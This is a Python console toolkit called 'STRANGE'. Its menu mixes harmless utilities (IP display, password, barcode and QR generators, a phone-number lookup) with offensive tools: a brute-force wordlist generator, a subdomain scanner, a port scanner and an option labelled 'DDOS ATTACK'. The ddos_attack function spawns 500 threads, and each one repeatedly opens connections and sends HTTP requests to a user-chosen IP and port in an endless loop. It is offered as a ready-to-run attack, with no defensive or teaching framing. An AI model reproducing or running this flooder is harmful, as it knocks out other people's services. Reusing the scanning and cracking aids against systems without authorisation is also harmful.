import os
import time
from tqdm import tqdm
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

def loading():
    for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
        time.sleep(0.01)
    print("LOADING DONE!")

def font(text):
    cool_text = Figlet(font="slant")
    return str(cool_text.renderText(text))

def window_size(columns=750, height=30):
    os.system("cls")
    os.system(f'mode con: cols={columns} lines={height}')

def find_my_ip():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    print("Your device is: " + hostname)
    print("YOUR IP ADDRESS IS: " + IPAddr)
    input("PRESS ENTER TO EXIT")

def generate_password(length):
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    numbers = "1234567890"
    symbols = "@#&*(){}[]/?"
    all_chars = lower + upper + numbers + symbols
    password = ''.join(random.choice(all_chars) for _ in range(length))
    return password

def generate_wordlist():
    chrs = input("Enter characters to use: ")
    min_len = int(input("MINIMUM LENGTH OF PASSWORD >>>>>--------> "))
    max_len = int(input("MAXIMUM LENGTH OF PASSWORD >>>>>--------> "))
    filename = input("[+] ENTER THE NAME OF THE FILE >>>>>--------> ")
    
    input('ARE YOU READY? [Press Enter]')
    start = time.time()
    
    with open(filename, 'w') as psd:
        for i in range(min_len, max_len + 1):
            for xs in itertools.product(chrs, repeat=i):
                psd.write(''.join(xs) + '\n')
    
    end = time.time()
    print("\nDONE SUCCESS")
    print(f"Total time: {end - start:.2f} seconds")

def ddos_attack(target, port):
    fake_ip = "181.4.20.196"
    already_connected = 0
    
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.close()
                global already_connected
                already_connected += 1
                if already_connected % 500 == 0:
                    print(already_connected)
            except:
                pass
    
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()

def generate_barcode():
    while True:
        number = input("Enter a 12-digit number for the barcode >>>>>--------> ")
        if len(number) != 12:
            print("Error: Please enter exactly 12 digits")
            continue
        if not number.isdigit():
            print("Error: Please enter only numeric digits")
            continue
        break
    
    try:
        writer = ImageWriter()
        my_code = EAN13(number, writer=writer)
        filename = input("Enter filename to save barcode (without extension) >>>>>--------> ")
        my_code.save(filename)
        print(f"Success: Barcode saved as {filename}.png")
    except Exception as e:
        print(f"Error generating barcode: {str(e)}")
    
    input("PRESS ENTER TO EXIT")

def generate_qrcode():
    data = input("Enter the data for QR code >>>>>--------> ")
    filename = input("Enter filename to save QR code (without extension) >>>>>--------> ")
    qr = pyqrcode.create(data)
    qr.svg(f"{filename}.svg", scale=8)
    print(f"QR code saved as {filename}.svg")
    input("PRESS ENTER TO EXIT")

def phone_info():
    number = input("Enter phone number with country code (e.g., +1234567890) >>>>>--------> ")
    try:
        phone = phonenumbers.parse(number)
        print(f"\nLocation: {geocoder.description_for_number(phone, 'en')}")
        print(f"Carrier: {carrier.name_for_number(phone, 'en')}")
        print(f"Valid: {phonenumbers.is_valid_number(phone)}")
        print(f"Possible: {phonenumbers.is_possible_number(phone)}")
    except Exception as e:
        print(f"Error: {str(e)}")
    input("PRESS ENTER TO EXIT")

def scan_subdomains():
    domain = input("Enter the domain to scan (e.g., example.com) >>>>>--------> ")
    print("\nScanning subdomains... This may take a while...")
    common_subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig']
    found_subdomains = []
    for subdomain in common_subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
            found_subdomains.append([subdomain + '.' + domain, "Active"])
        except requests.ConnectionError:
            pass
    if found_subdomains:
        print("\nFound subdomains:")
        print(tabulate(found_subdomains, headers=['Subdomain', 'Status'], tablefmt='grid'))
    else:
        print("\nNo subdomains found")
    input("PRESS ENTER TO EXIT")

def port_scanner():
    target = input("Enter the target IP address >>>>>--------> ")
    print("\nScanning ports... This may take a while...")
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append([port, "Open"])
        sock.close()
    if open_ports:
        print("\nOpen ports:")
        print(tabulate(open_ports, headers=['Port', 'Status'], tablefmt='grid'))
    else:
        print("\nNo open ports found")
    input("PRESS ENTER TO EXIT")


def main():
    window_size(80, 20)
    result = pyfiglet.figlet_format("STRANGE", font="5lineoblique")
    print(result)
    
    options = """
    1- MY IP ADDRESS
    2- PASSWORD GENERATOR
    3- WORDLIST GENERATOR
    4- BARCODE GENERATOR
    5- QRCODE GENERATOR
    6- PHONE NUMBER INFO
    7- SUBDOMAIN SCANNER
    8- PORT SCANNER
    9- DDOS ATTACK
    """
    
    print(options)
    while True:
        try:
            select = int(input("ENTER YOUR CHOICE >>>>>--------> "))
            if select == 1:
                print(font("FIND MY IP"))
                loading()
                find_my_ip()
            elif select == 2:
                print(font("PASSWORD GENERATOR"))
                loading()
                length = int(input("ENTER THE LENGTH OF THE PASSWORD >>>>>-----> "))
                password = generate_password(length)
                print(f"Generated Password: {password}")
                input("PRESS ENTER TO EXIT")
            elif select == 3:
                print(font("WORDLIST GENERATOR"))
                loading()
                generate_wordlist()
            elif select == 4:
                print(font("BARCODE GENERATOR"))
                loading()
                generate_barcode()
            elif select == 5:
                print(font("QR CODE GENERATOR"))
                loading()
                generate_qrcode()
            elif select == 6:
                print(font("PHONE NUMBER INFO"))
                loading()
                phone_info()
            elif select == 7:
                print(font("SUBDOMAIN SCANNER"))
                loading()
                scan_subdomains()
            elif select == 8:
                print(font("PORT SCANNER"))
                loading()
                port_scanner()
            elif select == 9:
                print(font("DDOS"))
                loading()
                target = input("ENTER THE IP ADDRESS >>>>>--------> ")
                port = int(input("ENTER THE PORT >>>>>-------------> "))
                ddos_attack(target, port)
                input("PRESS ENTER TO EXIT")

            else:
                print("Invalid option")
        except ValueError:
            print("Please enter a valid number")
        except KeyboardInterrupt:
            print("\nExiting...")
            break

if __name__ == "__main__":
    main()